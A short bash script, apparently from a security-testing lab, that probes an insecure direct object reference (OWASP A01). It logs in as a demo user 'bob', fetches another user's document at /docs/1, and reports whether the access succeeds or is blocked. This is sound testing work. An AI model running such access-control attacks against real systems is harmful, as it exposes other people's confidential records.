#!/usr/bin/env bash
# OWASP A01:2021 Broken Access Control - IDOR en /docs/{id}
source "$(dirname "$0")/lib.sh" "$@"

jar="$(login bob bob123)"
out="$EVIDENCE_DIR/03-idor-doc1.html"
code=$(curl_ -b "$jar" -o "$out" -w '%{http_code}' "$target/docs/1")
say "GET /docs/1 como bob (documento de alice) -> HTTP $code"

if [ "$code" = "200" ] && grep -q 'ANDES-9981' "$out"; then
    say "ATAQUE EXITOSO: bob leyo un documento confidencial de alice"
    say "evidence=$out"
    exit 0
fi
if [ "$code" = "403" ] || [ "$code" = "303" ]; then
    say "BLOQUEADO: el servidor verifico la propiedad del recurso (HTTP $code)"
    say "evidence=$out"
    exit 1
fi
say "RESULTADO INESPERADO (HTTP $code)"
exit 2
